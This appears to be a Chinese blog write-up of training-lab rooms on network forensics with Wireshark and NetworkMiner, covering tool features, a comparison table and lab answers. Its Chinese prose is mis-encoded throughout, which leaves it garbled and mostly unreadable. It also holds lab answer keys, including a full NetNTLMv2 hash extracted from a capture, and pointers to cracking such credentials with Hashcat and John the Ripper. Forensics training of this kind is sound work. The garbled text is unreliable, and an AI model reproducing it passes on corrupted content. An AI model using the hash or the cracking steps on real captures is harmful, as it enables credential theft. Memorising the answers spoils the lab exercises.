<p>éæ©æ°æ®åç¼å· 23ï¼ç¶åç¹å¼âIPFirewallâè§åï¼çä¸åè®¸allowç®æ  MAC å°åçè§åæ¯ä»ä¹ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/787073e08609ee5ac2814c8f0cc85ff6.png" alt="500" loading="lazy"></p>
<pre><code class="language-python">add allow MAC 00:d0:59:aa:af:80 any in
</code></pre>
<h4 id="ç»è®º">ç»è®º</h4>
<p>Wireshark æ¯å¼å±ç½ç»å®å¨è°æ¥çä¼ç§å·¥å·ãç¶èï¼å®ä¸è¶³ä»¥é»æ­¢å¨èãå®å¨åæå¸åºå·å¤å¥ä¾µæ£æµç³»ç» (IDS) /å¥ä¾µé²å¾¡ç³»ç»(IPS) çç¥è¯ä»¥åå¶ä»å·¥å·çä½¿ç¨æè½ï¼æè½æ£æµåé¢é²å¼å¸¸åå¨èãéçæ»å»ææ®µæ¥çå¤æï¼ä½¿ç¨å¤ç§å·¥å·åæ£æµç­ç¥å·²æä¸ºå¿è¦ã</p>
<h3 id="ç½ç»ç¿å·¥">ç½ç»ç¿å·¥</h3>
<p>å­¦ä¹ å¦ä½ä½¿ç¨ NetworkMiner åæè®°å½çæµéæä»¶å¹¶è¿è¡ç½ç»åè¯æ´»å¨ã</p>
<h4 id="ä»ç»-3">ä»ç»</h4>
<p><img src="https://i-blog.csdnimg.cn/img_convert/273bc41b58f1230d1cdad7626f34f4ba.png" alt="" loading="lazy"></p>
<p>NetworkMineræ¯ä¸æ¬¾å¼æºçæµéåæ¢å¨ãPCAPå¤çç¨åºååè®®åæå¨ï¼ç±Netresecå¼åå¹¶æç»­ç»´æ¤ã<br>
<a href="https://www.netresec.com/?page=NetworkMiner" target="_blank" rel="noopener nofollow">å®æ¹æè¿°ï¼</a><br>
NetworkMiner æ¯ä¸æ¬¾éç¨äº Windows çå¼æºç½ç»åè¯åæå·¥å· ( NFAT )ï¼ä¹æ¯æLinuxãMac OS X å FreeBSDï¼ãNetworkMiner å¯ç¨ä½è¢«å¨å¼ç½ç»åæ¢å¨/æ°æ®åæè·å·¥å·ï¼æ éå¨ç½ç»ä¸ææ¾ä»»ä½æµéå³å¯æ£æµæä½ç³»ç»ãä¼è¯ãä¸»æºåãå¼æ¾ç«¯å£ç­ä¿¡æ¯ãNetworkMiner è¿å¯ä»¥è§£æPCAPæä»¶ä»¥è¿è¡ç¦»çº¿åæï¼å¹¶ä»PCAPæä»¶ä¸­éæ°çæ/ç»è£ä¼ è¾çæä»¶åè¯ä¹¦ã</p>
<p>èª2007å¹´é¦æ¬¡åå¸ä»¥æ¥ï¼NetworkMinerå·²æä¸ºäºä»¶ååºå¢éåæ§æ³é¨é¨çç­é¨å·¥å·ãå¦ä»ï¼ä¸çåå°çå¬å¸åç»ç»é½å¨ä½¿ç¨NetworkMinerã</p>
<p>æ¬æ¿é´æ¨å¨æä¾ç½ç»åè¯çä¸è¬æ¦è¿°ï¼å¹¶ä½¿ç¨ NetworkMiner æ¥è°æ¥æè·çæµéã</p>
<ul>
<li>å­¦ä¹ ç®æ 
<ul>
<li>äºè§£ NetworkMiner æ¯ä»ä¹</li>
<li>å­¦ä¹  NetworkMiner çåºç¡ç¥è¯</li>
<li>æµè§ä¸åçä¿¡æ¯æ ç­¾é¡µï¼é«ææåä¿¡æ¯ã</li>
</ul>
</li>
</ul>
<h4 id="networkminer-å¨åè¯ä¸­çåºç¨">NetworkMiner å¨åè¯ä¸­çåºç¨</h4>
<p><img src="https://i-blog.csdnimg.cn/img_convert/5f2fece3edb79f2301b7925642fab033.png" alt="" loading="lazy"></p>
<h5 id="ç½ç»ææå¨åè¯ä¸­çåºç¨">ç½ç»ææå¨åè¯ä¸­çåºç¨</h5>
<p>ç½ç»åè¯çæç»ç®æ æ¯æä¾è¶³å¤çä¿¡æ¯ï¼ä»¥ä¾¿æ ¹æ®ç½ç»æµéæ£æµæ¶ææ´»å¨ãå®å¨æ¼æ´åç½ç»å¼å¸¸ãNetworkMiner æ¯ä¸ä¸ªå¼ºå¤§çè¾å©å·¥å·ï¼å®å¯ä»¥å¿«éæä¾æç¨ççº¿ç´¢ï¼æå¯¼æ¨ä»ä½å¤çæï¼å·ä½åæ¬ï¼</p>
<ul>
<li>æè·ä¸»æºçä¸ä¸æä¿¡æ¯ï¼ä¾å¦å¶ IP å°åå MAC å°åãä¸»æºåææä½ç³»ç»ä¿¡æ¯</li>
<li>æ½å¨æ»å»ææ æå¼å¸¸æåµåè¡¨ï¼ä¾å¦æµéæ¿å¢æç«¯å£æ«æ</li>
<li>ç¨äºæ§è¡æ½å¨æ»å»çå·¥å·æå·¥å·åï¼ä¾å¦Nmapã</li>
</ul>
<h5 id="æ¯æçæ°æ®ç±»å">æ¯æçæ°æ®ç±»å</h5>
<p>ç½ç»åè¯ä¸­ä¸»è¦è°æ¥ä¸ç§æ°æ®ç±»åï¼</p>
<ul>
<li><strong>å®æ¶è·¯åµ</strong></li>
<li><strong>æµéæè·</strong></li>
<li><strong>æ¥å¿æä»¶</strong></li>
</ul>
<p>NetworkMiner è½å¤å¤çæ°æ®åæè·æä»¶ ( PCAP ) åå®æ¶æµéãå æ­¤ï¼å¨æ¬è®¨è®ºä¸­ï¼æä»¬å°éç¹å³æ³¨å®æ¶æµéåæè·çæµéã</p>
<h4 id="networkmineræ¯ä»ä¹">NetworkMineræ¯ä»ä¹ï¼</h4>
<h5 id="networkminer-ç®ä»">NetworkMiner ç®ä»</h5>
<table>
<thead>
<tr>
<th><strong>è½å</strong></th>
<th><strong>æè¿°</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><strong>äº¤éåæ¢</strong></td>
<td>å®å¯ä»¥æ¦æªç½ç»æµéï¼åæ¢ç½ç»æµéï¼å¹¶æ¶éåè®°å½éè¿ç½ç»çæ°æ®åã</td>
</tr>
<tr>
<td><strong>è§£æPCAPæä»¶</strong></td>
<td>å®å¯ä»¥è§£æpcapæä»¶å¹¶è¯¦ç»æ¾ç¤ºæ°æ®åçåå®¹ã</td>
</tr>
<tr>
<td><strong>æ¹æ¡åæ</strong></td>
<td>å®å¯ä»¥ä»è§£æåçpcapæä»¶ä¸­è¯å«æä½¿ç¨çåè®®ã</td>
</tr>
<tr>
<td><strong>æä½ç³»ç»æçº¹è¯å«</strong></td>
<td>å®å¯ä»¥éè¿è¯»åpcapæä»¶æ¥è¯å«æä½¿ç¨çæä½ç³»ç»ãæ­¤åè½é«åº¦ä¾èµäº <a href="https://github.com/xnih/satori/" target="_blank" rel="noopener nofollow">Satori</a> å <a href="https://lcamtuf.coredump.cx/p0f3/" target="_blank" rel="noopener nofollow">p0f</a>ã<a href="https://github.com/xnih/satori/" target="_blank" rel="noopener nofollow"></a><a href="https://lcamtuf.coredump.cx/p0f3/" target="_blank" rel="noopener nofollow"></a></td>
</tr>
<tr>
<td><strong>æä»¶æå</strong></td>
<td>å®å¯ä»¥ä»è§£æåçpcapæä»¶ä¸­æåå¾åãHTML æä»¶åçµå­é®ä»¶ã</td>
</tr>
<tr>
<td><strong>å­è¯çªå</strong></td>
<td>å®å¯ä»¥ä»è§£æåçpcapæä»¶ä¸­æåå­æ®ã</td>
</tr>
<tr>
<td><strong>ææå³é®è¯è§£æ</strong></td>
<td>å®å¯ä»¥ä»è§£æåçpcapæä»¶ä¸­æåææå³é®å­åå­ç¬¦ä¸²ã</td>
</tr>
</tbody>
</table>
<p><a href="https://www.netresec.com/?page=NetworkMiner" target="_blank" rel="noopener nofollow"><strong>æä»¬å¨è¿ä¸ªæ¿é´éä½¿ç¨çæ¯ NetworkMiner åè´¹çï¼ä½ä¸ä¸ççåè½è¦ä¸°å¯å¾å¤ãæ¨å¯ä»¥å¨è¿éï¼https://www.netresec.com/?page=NetworkMiner</strong></a><strong>æ¥çåè´¹çåä¸ä¸çä¹é´çåºå«</strong> <strong>ã</strong></p>
<h5 id="æä½æ¨¡å¼">æä½æ¨¡å¼</h5>
<p>ä¸»è¦æä¸¤ç§è¿è¡æ¨¡å¼ï¼</p>
<ul>
<li><strong>åæ¢æ¨¡å¼</strong>ï¼è½ç¶å®å·å¤åæ¢åè½ï¼ä½å¹¶éè®¾è®¡ç¨äºä½ä¸ºåæ¢å¨ä½¿ç¨ãåæ¢åè½ä»å¨ Windows ç³»ç»ä¸å¯ç¨ãä¸è¿ï¼å¶ä»åè½å¨ Windows åLinux æä½ç³»ç»ä¸åå¯ç¨ãæ ¹æ®ç»éªï¼åæ¢åè½çå¯é æ§ä¸å¦å¶ä»åè½ãå æ­¤ï¼æä»¬å»ºè®®ä¸è¦å°æ­¤å·¥å·ç¨ä½ä¸»è¦åæ¢å¨ãå³ä½¿è¯¥å·¥å·çå®æ¹æè¿°ä¸­æå°å®æ¯âç½ç»åè¯åæå·¥å·âï¼ä½å®ä¹å¯ä»¥ç¨ä½âåæ¢å¨âãæ¢å¥è¯è¯´ï¼å®æ¯ä¸æ¬¾ç½ç»åè¯åæå·¥å·ï¼è½ç¶å·å¤åæ¢åè½ï¼ä½å®å¹¶éå Wireshark å tcpdump é£æ ·çä¸ç¨åæ¢å¨ã</li>
<li><strong>æ°æ®åè§£æ/å¤ç</strong>ï¼NetworkMiner å¯ä»¥è§£ææµéæè·æ°æ®ï¼ä»¥ä¾¿å¿«éæ¦è§åäºè§£æåæçæè·æ°æ®ãå»ºè®®ä¸»è¦ä½¿ç¨æ­¤æä½æ¨¡å¼ï¼ä»¥ä¾¿å¨æ·±å¥è°æ¥ä¹ååè·åâå¾æå¯å¾âçä¿¡æ¯ã</li>
</ul>
<h5 id="ä¼ç¹åç¼ºç¹">ä¼ç¹åç¼ºç¹</h5>
<p>å¦åææè¿°ï¼NetworkMiner ä¸»è¦ç¨äºè·åç½ç»æ¦è§ãå¨å¼å§åææµéæ°æ®ä¹åï¼æä»¬åæ¥çç <strong>NetworkMiner çä¼ç¼ºç¹ã</strong></p>
<p><strong>ä¼ç¹</strong></p>
<ul>
<li>æä½ç³»ç»æçº¹è¯å«</li>
<li>è½»æ¾æåæä»¶</li>
<li>å­è¯çªå</li>
<li>ææå³é®è¯è§£æ</li>
<li>æ»ä½æ¦è¿°</li>
</ul>
<p><strong>ç¼ºç¹</strong></p>
<ul>
<li>å¨ä¸»å¨åæ¢ä¸­ä¸èµ·ä½ç¨</li>
<li>ä¸éç¨äºå¤§åpcapåæ</li>
<li>æéè¿æ»¤</li>
<li>å¹¶éä¸ºäººå·¥äº¤éè°æ¥èè®¾è®¡</li>
</ul>
<h5 id="wireshark-å-networkminer-çåºå«">Wireshark å NetworkMiner çåºå«</h5>
<p>NetworkMiner å Wireshark çåºæ¬åè½ç¸ä¼¼ï¼ä½ç¨éä¸åãè½ç¶ä¸»è¦åè½ç¸åï¼ä½æäºåè½å¨ç¹å®åºç¨åºæ¯ä¸æ´ä¸ºå¼ºå¤§ã</p>
<p>æä½³å®è·µæ¯è®°å½æµéä»¥è¿è¡ç¦»çº¿åæï¼ä½¿ç¨ NetworkMiner å¿«éæ¥çpcap æä»¶ï¼ç¶åä½¿ç¨ Wireshark è¿è¡æ·±å¥è°æ¥ã</p>
<table>
<thead>
<tr>
<th><strong>ç¹å¾</strong></th>
<th><strong>ç½ç»ç¿å·¥</strong></th>
<th><strong>Wireshark</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>ç®ç</td>
<td>å¿«éæ¦è§ãäº¤éå°å¾åæ°æ®æå</td>
<td>æ·±å¥åæ</td>
</tr>
<tr>
<td>å¾å½¢ç¨æ·çé¢</td>
<td>â</td>
<td>â</td>
</tr>
<tr>
<td>åé»</td>
<td>â</td>
<td>â</td>
</tr>
<tr>
<td>å¤çPCAP</td>
<td>â</td>
<td>â</td>
</tr>
<tr>
<td>æä½ç³»ç»æçº¹è¯å«</td>
<td>â</td>
<td>â</td>
</tr>
<tr>
<td>åæ°/å³é®è¯åç°</td>
<td>â</td>
<td>æå¨ç</td>
</tr>
<tr>
<td>å­è¯åç°</td>
<td>â</td>
<td>â</td>
</tr>
<tr>
<td>æä»¶æå</td>
<td>â</td>
<td>â</td>
</tr>
<tr>
<td>ç­ééé¡¹</td>
<td>æéç</td>
<td>â</td>
</tr>
<tr>
<td>æ°æ®åè§£ç </td>
<td>æéç</td>
<td>â</td>
</tr>
<tr>
<td>æ¹æ¡åæ</td>
<td>â</td>
<td>â</td>
</tr>
<tr>
<td>ææè½½è·åæ</td>
<td>â</td>
<td>â</td>
</tr>
<tr>
<td>ç»è®¡åæ</td>
<td>â</td>
<td>â</td>
</tr>
<tr>
<td>è·¨å¹³å°æ¯æ</td>
<td>â</td>
<td>â</td>
</tr>
<tr>
<td>ä¸»æºåç±»</td>
<td>â</td>
<td>â</td>
</tr>
<tr>
<td>æäºç®¡ç</td>
<td>â</td>
<td>â</td>
</tr>
</tbody>
</table>
<h4 id="å·¥å·æ¦è¿°-1">å·¥å·æ¦è¿° 1</h4>
<h5 id="é¦é¡µ">é¦é¡µ</h5>
<p>è¿æ¯ NetworkMiner çé¦é¡µãæå¼åºç¨ç¨åºåï¼å°±ä¼å è½½æ­¤å±å¹ã</p>
<h5 id="æä»¶èå">æä»¶èå</h5>
<p>æä»¶èåå¯å¸®å©æ¨å è½½Pcapæä»¶æéè¿ IP æ¥æ¶Pcap æä»¶ãæ¨ä¹å¯ä»¥ææ¾Pcapæä»¶ãNetworkMiner ä¹æ¯æéè¿ IP æ¥æ¶ Pcap æä»¶ãæ¬æ¿é´å»ºè®®å° NetworkMiner ä½ä¸ºåæ­¥è°æ¥å·¥å·ï¼ç¨äºè·åæäºè·åçä¿¡æ¯åæµéæ¦è§ãå æ­¤ï¼æ¬æ¿é´å°è·³è¿éè¿ IP æ¥æ¶ Pcap æä»¶çè®²è§£ãæ¨å¯ä»¥ç¹å»<a href="https://www.netresec.com/?page=Blog&amp;month=2011-09&amp;post=Pcap-over-IP-in-NetworkMiner" target="_blank" rel="noopener nofollow">æ­¤å¤ï¼https://www.netresec.com/?page=Blog&amp;month=2011-09&amp;post=Pcap-over-IP-in-NetworkMiner</a> å <a href="http://www.gavinhollinger.com/2016/10/pcap-over-ip-to-networkminer.html" target="_blank" rel="noopener nofollow">æ­¤å¤ï¼http://www.gavinhollinger.com/2016/10/pcap-over-ip-to-networkminer.html</a>éè¯»æå³éè¿ IP æ¥æ¶Pcap æä»¶çæ´å¤ä¿¡æ¯ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/b2d656f4f4802dc050471f0b0a2b25e9.png" alt="" loading="lazy"></p>
<h5 id="å·¥å·èå">å·¥å·èå</h5>
<p>å·¥å·èåå¯å¸®å©æ¨æ¸é¤ä»ªè¡¨æ¿å¹¶å é¤å·²æè·çæ°æ®ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/37da1733693f421ab77de35f61b5dadc.png" alt="" loading="lazy"></p>
<h5 id="å¸®å©èå">å¸®å©èå</h5>
<p>å¸®å©èåæä¾æå³æ´æ°åå½åçæ¬çä¿¡æ¯ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/36ab110bbc53808677744d0c39e30a38.png" alt="" loading="lazy"></p>
<h5 id="æºç®±é¢æ¿">æºç®±é¢æ¿</h5>
<p>æ¡ä¾é¢æ¿æ¾ç¤ºå·²è°æ¥çpcapæä»¶åè¡¨ãæ¨å¯ä»¥ä»æ­¤é¢æ¿éæ°å è½½/å·æ°ãæ¥çåæ°æ®è¯¦ç»ä¿¡æ¯ä»¥åå é¤å·²å è½½çæä»¶ã<br>
<img src="https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=https%3A%2F%2Fimg2024.cnblogs.com%2Fblog%2F3392862%2F202512%2F3392862-20251229081113966-1396539303.png&amp;pos_id=img-l2N7ugdJ-1767225916457" alt="å¤é¾å¾çè½¬å­å¤±è´¥,æºç«å¯è½æé²çé¾æºå¶,å»ºè®®å°å¾çä¿å­ä¸æ¥ç´æ¥ä¸ä¼ " loading="lazy"><br>
<strong>æ¥çå·²å è½½æä»¶çåæ°æ®</strong><br>
ä¸å¾å±ç¤ºäºå¦ä½æ¥çå·²å è½½æä»¶çåæ°æ®<br>
<img src="https://i-blog.csdnimg.cn/img_convert/b18bb9fa27485b70c1d9d4c1870c1da9.png" alt="500" loading="lazy"></p>
<h5 id="ä¸»æº">ä¸»æº</h5>
<p>âä¸»æºâèåæ¾ç¤ºpcapæä»¶ä¸­å·²è¯å«çä¸»æºãæ¬é¨åæä¾ä»¥ä¸ä¿¡æ¯ï¼</p>
<ul>
<li>IPå°å</li>
<li>MACå°å</li>
<li>æä½ç³»ç»ç±»å</li>
<li>å¼æ¾ç«¯å£</li>
<li>å·²åé/å·²æ¥æ¶æ°æ®å</li>
<li>ä¼ å¥/ä¼ åºä¼è¯</li>
<li>æ¿ä¸è¯¦æ</li>
</ul>
<p>æä½ç³»ç»æçº¹è¯å«ä½¿ç¨ Satori GitHub ä»åºå p0fï¼MAC å°åæ°æ®åºä½¿ç¨ mac-ages GitHub ä»åºã</p>
<p>æ¨å¯ä»¥ä½¿ç¨æåºèåå¯¹å·²è¯å«çä¸»æºè¿è¡æåºãæ¨è¿å¯ä»¥æ´æ¹ä¸»æºçé¢è²ãæäºåè½ï¼ä¾å¦å¼æºææ¥æ¥æ¾ï¼ä»å¨é«çº§çä¸­å¯ç¨ãå³é®èåè¿å¯ä»¥å¸®å©æ¨å¤å¶éå®çå¼ã<br>
<img src="https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=https%3A%2F%2Fimg2024.cnblogs.com%2Fblog%2F3392862%2F202512%2F3392862-20251229081113191-1921133161.png&amp;pos_id=img-563I6b4N-1767225916457" alt="å¤é¾å¾çè½¬å­å¤±è´¥,æºç«å¯è½æé²çé¾æºå¶,å»ºè®®å°å¾çä¿å­ä¸æ¥ç´æ¥ä¸ä¼ " loading="lazy"></p>
<h5 id="ä¼è¯-1">ä¼è¯</h5>
<p>ä¼è¯èåæ¾ç¤ºpcapæä»¶ä¸­æ£æµå°çä¼è¯ãæ¬é¨åæä¾ä»¥ä¸ä¿¡æ¯ï¼</p>
<ul>
<li>è½¦æ¶å·</li>
<li>å®¢æ·ç«¯åæå¡å¨å°å</li>
<li>å§åæ¸¯åç®çæ¸¯</li>
<li>åè®®</li>
<li>å¼å§æ¶é´<br>
<img src="https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=https%3A%2F%2Fimg2024.cnblogs.com%2Fblog%2F3392862%2F202512%2F3392862-20251229081112797-1207843029.png&amp;pos_id=img-s9a8g5v9-1767225916457" alt="å¤é¾å¾çè½¬å­å¤±è´¥,æºç«å¯è½æé²çé¾æºå¶,å»ºè®®å°å¾çä¿å­ä¸æ¥ç´æ¥ä¸ä¼ " loading="lazy"></li>
</ul>
<p>æ¨å¯ä»¥ä½¿ç¨ç­éæ å¨æ¡æ¶åæç´¢å³é®è¯ãä¹å¯ä»¥ç­éä¼è¯èåçç¹å®åãæ­¤èåæ¥ååç§ç±»åçè¾å¥ï¼</p>
<ul>
<li>âç²¾ç¡®ç­è¯­â</li>
<li>âAllWordsâ</li>
<li>âAnyWordâ</li>
<li>æ­£åè¡¨è¾¾å¼</li>
</ul>
<h5 id="dns-1">DNS</h5>
<p>DNSèåæ¾ç¤ºDNSæ¥è¯¢çè¯¦ç»ä¿¡æ¯ãæ¬é¨åæä¾ä»¥ä¸ä¿¡æ¯ï¼</p>
<ul>
<li>è½¦æ¶å·</li>
<li>æ¶é´æ³</li>
<li>å®¢æ·ç«¯åæå¡å¨</li>
<li>å§åæ¸¯åç®çæ¸¯</li>
<li>IP TTL</li>
<li>DNSæ¶é´</li>
<li>äº¤æ ID åç±»å</li>
<li>DNSæ¥è¯¢ååºç­</li>
<li>Alexaæåå100ä¸</li>
</ul>
<p>é¨ååè½ï¼ä¾å¦ Alexa Top 1Mï¼ä»å¨é«çº§çä¸­å¯ç¨ãæç´¢æ ä¹å¨æ­¤çæ¬ä¸­å¯ç¨ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/ab59ad06218ea8bccfcc8d49e3ed8416.png" alt="500" loading="lazy"></p>
<h5 id="è¯ä¹¦">è¯ä¹¦</h5>
<p>å­æ®èåæ¾ç¤ºä»å·²åæç pcap æä»¶ä¸­æåçå­æ®åå¯ç åå¸ <a href="https://tryhackme.com/room/hashingcrypto101" target="_blank" rel="noopener nofollow">å¼</a> ãæ¨å¯ä»¥ä½¿ç¨ <a href="https://tryhackme.com/room/crackthehashlevel2" target="_blank" rel="noopener nofollow">Hashcat</a> ï¼<a href="https://github.com/hashcat/hashcat" target="_blank" rel="noopener nofollow">GitHub</a>ï¼å <a href="https://tryhackme.com/room/johntheripper0" target="_blank" rel="noopener nofollow">John the Ripper</a>  ï¼<a href="https://github.com/openwall/john" target="_blank" rel="noopener nofollow">GitHub</a>ï¼è§£å¯æåçå­æ®ãNetworkMiner å¯ä»¥æåçå­æ®åæ¬ï¼</p>
<ul>
<li>Kerberosåå¸</li>
<li>NTLMåå¸</li>
<li>RDP cookie</li>
<li>HTTP Cookie</li>
<li>HTTPè¯·æ±</li>
<li>IMAP</li>
<li>FTP</li>
<li>SMTP</li>
<li>MS SQL</li>
</ul>
<p>å³é®èåå¨è¿éä¹å¾æç¨ãæ¨å¯ä»¥è½»æ¾å¤å¶ç¨æ·ååå¯ç ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/9d560bbd4933c3bdc4d649aedaed6c36.png" alt="500" loading="lazy"></p>
<p>æ»å±æå¤å°å¸§ï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/c62e7155e54747ea201155eefc7beb59.png" alt="500" loading="lazy"><br>
<img src="https://i-blog.csdnimg.cn/img_convert/040e6fc9ddb0a5bf149d9578f9b11ccd.png" alt="500" loading="lazy"></p>
<pre><code class="language-python">460
</code></pre>
<p>æå¤å°ä¸ª IP å°åä¸ä¸»æº 145.253.2.203 ä½¿ç¨ç¸åç MAC å°åï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/45aeb3427a068faee44087ca11e248d5.png" alt="" loading="lazy"></p>
<pre><code class="language-python">2
</code></pre>
<p>ä¸»æº 65.208.228.223 åéäºå¤å°ä¸ªæ°æ®åï¼<br>
<img src="https://i-blog.csdnimg.cn/img_convert/a13a473647c36f463aea8cb3d2c0c676.png" alt="" loading="lazy"></p>
<pre><code class="language-python">72
</code></pre>
<p>ä¸»æº 65.208.228.223 ä¸ç Web æå¡å¨çbannerï¼å³æçº¹ç±»åæ¯ä»ä¹ï¼<br>
<img src="https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=https%3A%2F%2Fimg2024.cnblogs.com%2Fblog%2F3392862%2F202512%2F3392862-20251229081110100-1221067365.png&amp;pos_id=img-h8EX5CST-1767225916457" alt="å¤é¾å¾çè½¬å­å¤±è´¥,æºç«å¯è½æé²çé¾æºå¶,å»ºè®®å°å¾çä¿å­ä¸æ¥ç´æ¥ä¸ä¼ " loading="lazy"></p>
<pre><code class="language-python">apache
</code></pre>
<p>02694W-WIN10 ä¸»æºçæåç¨æ·åæ¯ä»ä¹ï¼<br>
<img src="https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=https%3A%2F%2Fimg2024.cnblogs.com%2Fblog%2F3392862%2F202512%2F3392862-20251229081109747-1539749994.png&amp;pos_id=img-vf3rB8uU-1767225916457" alt="å¤é¾å¾çè½¬å­å¤±è´¥,æºç«å¯è½æé²çé¾æºå¶,å»ºè®®å°å¾çä¿å­ä¸æ¥ç´æ¥ä¸ä¼ " loading="lazy"></p>
<pre><code class="language-python">#B\Administrator
</code></pre>
<p>ç»å½å° 02694W-WIN10 ä¸»æºçç¨æ·çå·²æåå¯ç æ¯ä»ä¹ï¼è¯·è¾å¥å®æ´ç NTLM åå¸å¼ã</p>
<pre><code class="language-python">$NETNTLMv2$#B$136B077D942D9A63$FBFF3C253926907AAAAD670A9037F2A5$01010000000000000094D71AE38CD60170A8D571127AE49E00000000020004003300420001001E003000310035003600360053002D00570049004E00310036002D004900520004001E0074006800720065006500620065006500730063006F002E0063006F006D0003003E003000310035003600360073002D00770069006E00310036002D00690072002E0074006800720065006500620065006500730063006F002E0063006F006D0005001E0074006800720065006500620065006500730063006F002E0063006F006D00070008000094D71AE38CD601060004000200000008003000300000000000000000000000003000009050B30CECBEBD73F501D6A2B88286851A6E84DDFAE1211D512A6A5A72594D340A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E00360036002E0033003600000000000000000000000000
</code></pre>
<h4 id="å·¥å·æ¦è¿°-2">å·¥å·æ¦è¿° 2</h4>
<h5 id="æä»¶">æä»¶</h5>
<p>æä»¶èåæ¾ç¤ºä»å·²åæç pcap æä»¶ä¸­æåçæä»¶ãæ¬é¨åæä¾ä»¥ä¸ä¿¡æ¯ï¼</p>
<ul>
<li>è½¦æ¶å·</li>
<li>æä»¶å</li>
<li>æ©å¤§</li>
<li>å°ºå¯¸</li>
<li>æºå°ååç®æ å°å</li>
<li>å§åæ¸¯åç®çæ¸¯</li>
<li>åè®®</li>
<li>æ¶é´æ³</li>
<li>éå»ºè·¯å¾</li>
<li>ç»è</li>
</ul>
<p>é¨ååè½ï¼ä¾å¦å¼æºææ¥åå¸å¼æ¥æ¾åæ ·æ¬æäº¤ï¼ä»å¨é«çº§çä¸­å¯ç¨ãæç´¢æ ä¹å¨æ­¤å¤å¯ç¨ãå³é®èåå¨æ­¤ä¹ååå®ç¨ãæ¨å¯ä»¥è½»æ¾æå¼æä»¶åæä»¶å¤¹ï¼å¹¶æ¥çæä»¶çè¯¦ç»ä¿¡æ¯ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/c83d1ef3c997d78ee84ed5af7d7ec242.png" alt="" loading="lazy"></p>
<h5 id="å¾ç">å¾ç</h5>
<p>æä»¶èåæ¾ç¤ºä»åæç pcap æä»¶ä¸­æåçå¾åãå³é®èåå¨è¿éä¹å¾æç¨ãæ¨å¯ä»¥è½»æ¾æå¼æä»¶å¹¶æ¾å¤§ç¼©å°ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/5e5be50c2e95733cc099f7adfd134cfc.png" alt="600" loading="lazy"><br>
å°é¼ æ æ¬åå¨å¾åä¸ï¼å³å¯æ¾ç¤ºæä»¶çè¯¦ç»ä¿¡æ¯ï¼æºå°åãç®æ å°ååæä»¶è·¯å¾ï¼ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/5135754094ca52cb7b72b4b3f70dd53f.png" alt="" loading="lazy"></p>
<h5 id="åæ°">åæ°</h5>
<p>æä»¶èåæ¾ç¤ºä»æåæç pcap æä»¶ä¸­æåçåæ°ãæ¬é¨åæä¾ä»¥ä¸ä¿¡æ¯ï¼</p>
<ul>
<li>åæ°åç§°</li>
<li>åæ°å¼</li>
<li>è½¦æ¶å·</li>
<li>æºä¸»æºåç®æ ä¸»æº</li>
<li>å§åæ¸¯åç®çæ¸¯</li>
<li>æ¶é´æ³</li>
<li>ç»è</li>
</ul>
<p>å³é®èåå¨è¿éä¹å¾æç¨ãæ¨å¯ä»¥è½»æ¾å¤å¶åæ°åå¼ã<br>
<img src="https://i-blog.csdnimg.cn/img_convert/ab5e7671e2770063e563f1fe99f90355.png" alt="" loading="lazy"></p>
<h5 id="å³é®è¯keyword">å³é®è¯(keyword)</h5>
<p>æä»¶èåæ¾ç¤ºä»å·²åæç pcap æä»¶ä¸­æåçå³é®è¯ãæ¬é¨åæä¾ä»¥ä¸ä¿¡æ¯ï¼</p>
<ul>
<li>è½¦æ¶å·</li>
<li>æ¶é´æ³</li>
<li>å³é®è¯</li>
<li>è¯­å¢</li>
<li>æºä¸»æºåç®æ ä¸»æº</li>
<li>å§åæ¸¯åç®çæ¸¯</li>
</ul>
<p><strong>å¦ä½ç­éå³é®è¯ï¼</strong></p>
<ul>
<li>æ·»å å³é®è¯</li>
<li>éæ°å è½½æ¡ä»¶æ¡£æ¡ï¼</li>
</ul>
<p><strong>æ³¨æï¼</strong> æ¨å¯ä»¥å¨æ­¤é¨åç­éå¤ä¸ªå³é®è¯ï¼ä½æ¯ï¼æ´æ°æç´¢å³é®è¯åï¼æ¨å¿é¡»éæ°å è½½æ¡ä¾æä»¶ãå³é®è¯æç´¢ä¼æç´¢å·²å¤ç pcap æä»¶ä¸­çææå¯è½æ°æ®ã<br>
<img src="https://img-home.csdnimg.cn/images/20230724024159.png?origin_url=https%3A%2F%2Fimg2024.cnblogs.com%2Fblog%2F3392862%2F202512%2F3392862-20251229081107193-1624073098.png&amp;pos_id=img-e4o2UobV-1767225916458" alt="å¤é¾å¾çè½¬å­å¤±è´¥,æºç«å¯è½æé²çé¾æºå¶,å»ºè®®å°å¾çä¿å­ä¸æ¥ç´æ¥ä¸ä¼ " loading="lazy"></p>
<h5 id="æ¶æ¯">æ¶æ¯</h5>
<p>æ¶æ¯èåæ¾ç¤ºä»å·²è°æ¥ç pcap æä»¶ä¸­æåççµå­é®ä»¶ãèå¤©è®°å½åæ¶æ¯ãæ¬é¨åæä¾ä»¥ä¸ä¿¡æ¯ï¼</p>
<ul>
<li>è½¦æ¶å·</li>
<li>æºä¸»æºåç®æ ä¸»æº</li>
<li>åè®®</li>
<li>åä»¶äººï¼Fromï¼</li>
<li>æ¥æ¶å¨ï¼è³ï¼</li>
<li>æ¶é´æ³</li>
<li>å°ºå¯¸</li>
</ul>
